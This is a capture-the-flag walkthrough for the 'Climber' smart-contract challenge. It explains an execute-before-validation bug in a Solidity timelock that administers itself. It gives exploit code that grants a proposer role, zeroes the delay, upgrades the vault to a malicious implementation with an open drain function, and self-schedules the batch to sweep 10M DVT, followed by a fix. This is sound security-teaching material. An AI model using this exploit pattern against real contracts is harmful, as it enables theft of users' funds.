## Challenge 12 Walkthrough: Climber

### Vulnerability

`ClimberTimelock.execute` performs the scheduled calls *before* it checks that the operation was actually scheduled and ready:

```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    ...
    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);  // ← runs FIRST
    }

    if (getOperationState(id) != OperationState.ReadyForExecution) {     // ← checked AFTER
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```

`execute` is permissionless, and the timelock holds `ADMIN_ROLE` over itself:

```solidity
constructor(address admin, address proposer) {
    _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
    _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);
    _grantRole(ADMIN_ROLE, admin);
    _grantRole(ADMIN_ROLE, address(this)); // ← self-administration
    _grantRole(PROPOSER_ROLE, proposer);
    delay = 1 hours;
}
```

Because the calls execute before the readiness check, a single `execute` batch can grant itself a proposer role, drop the delay to zero, and schedule *itself* — so that by the time the post-loop check runs, the operation is already `ReadyForExecution`. `updateDelay` is callable since `msg.sender == address(this)` during the batch.

### Exploit

```solidity
function test_climber() public checkSolvedByPlayer {
    ClimberAttacker attacker = new ClimberAttacker(
        payable(address(timelock)), address(vault), address(token), recovery
    );
    attacker.exploit();
}
```

The attacker builds one batch of four calls (identical in both `execute` and the self-`schedule`):

**Step 1 — Grant the attacker `PROPOSER_ROLE`.** The timelock admins itself, so it can grant roles.

```solidity
data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
```

**Step 2 — Set the delay to zero.** Caller is the timelock, so `updateDelay` passes; a scheduled op becomes ready instantly.

```solidity
data[1] = abi.encodeWithSignature("updateDelay(uint64)", uint64(0));
```

**Step 3 — Upgrade the vault and drain it.** The timelock owns the UUPS vault. Upgrade to a malicious implementation and, in the same call, sweep all DVT to recovery.

```solidity
data[2] = abi.encodeWithSignature(
    "upgradeToAndCall(address,bytes)",
    pwnedImpl,
    abi.encodeWithSignature("sweepAll(address,address)", token, recovery)
);
```

```solidity
// PwnedVault — UUPS-compatible implementation with an open drain
function sweepAll(address token, address recovery) external {
    IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
}
function _authorizeUpgrade(address) internal override {}
```

**Step 4 — Schedule this very batch.** Now a proposer, the attacker reconstructs the identical `(targets, values, data, salt)` and schedules it. With delay 0 the operation is immediately `ReadyForExecution`, so the post-loop check passes.

```solidity
data[3] = abi.encodeWithSignature("scheduleSelf()");
```

```
attacker.exploit()
    └─> timelock.execute([grantRole, updateDelay(0), upgradeToAndCall, scheduleSelf])
            ├─ grantRole(PROPOSER, attacker)        (timelock admins itself)
            ├─ updateDelay(0)                        (msg.sender == timelock)
            ├─ vault.upgradeToAndCall(PwnedVault, sweepAll(token, recovery))  → 10M DVT to recovery
            ├─ attacker.scheduleSelf()               (now a proposer; delay 0 ⇒ ReadyForExecution)
            └─ post-loop state check: ReadyForExecution ✓ (does not revert)
```

### Why It Works

The timelock checks authorization *after* performing the actions it was meant to gate, and it is its own admin — so the batch bootstraps every privilege it needs from nothing: a role grant, a delay reset, and a self-schedule that retroactively legitimizes the operation. Once the timelock (the vault's owner) is under attacker control, the UUPS upgrade hands over the vault's logic entirely.

The fix is to enforce check-effects-interactions: verify `getOperationState(id) == ReadyForExecution` *before* the execution loop, and not grant the timelock administrative power over itself.

This is an **execute-before-validation timelock takeover** — a single self-scheduling batch upgrades the vault and drains all 10M DVT to recovery.
